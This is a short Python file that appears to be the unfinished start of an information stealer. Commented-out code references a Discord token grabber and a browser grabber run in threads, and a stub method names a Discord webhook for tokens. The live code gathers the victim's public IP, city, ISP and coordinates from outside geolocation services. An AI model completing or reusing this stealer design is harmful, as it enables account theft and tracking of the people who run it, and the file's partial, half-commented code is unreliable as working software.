# import threading
import json
from urllib.request import Request, urlopen
# from modules.discord_token import DiscordToken
# from browser_grabber import run as run_browser


class Core:
    def __init__(self):
        self.main()

        self.payload = []
        self.Threadlist = []
        self.infoDevice = []

    
    def main(self):
        print('Teste')
        self.getInfoDevice()
        
        # t1 = threading.Thread(target=run_discord)
        # t2 = threading.Thread(target=run_browser)
        # t3 = threading.Thread(target=self.getInfoDevice())

        # t1.start()
        # t2.start()

        # self.Threadlist.append(t1)
        # self.Threadlist.append(t2)

        # for t in self.Threadlist:
        #     t.join()
        # for patt in discordPaths:
        #     a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        #     a.start()
        #     Threadlist.append(a)
        # threads.append(threading.Thread(target=run_discord))
        # threads.append(threading.Thread(target=run_browser))
            
        #         for t in threads:
        #     t.start()

        # for t in threads:
        #     t.join()
        
    def getInfoDevice(self):
        try:
            ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
            
            if ip:
                response = urlopen(Request(f'http://ip-api.com/json/{ip}')).read().decode()
               
                data = json.loads(response)
                
                self.infoDevice = {
                    'ip': data.get('query') or ip, 
                    'country': data.get('country'),
                    'region': data.get('region'),
                    'regionName': data.get('regionName'),
                    'city': data.get('city'),
                    'isp': data.get('isp'),
                    'latitude': data.get('lat'),
                    'longitude': data.get('lon')
                }
 
        except:
            return
    
    
    def discordWebhook(self, token):
        print(1)
    
if __name__ == "__main__":
    Core()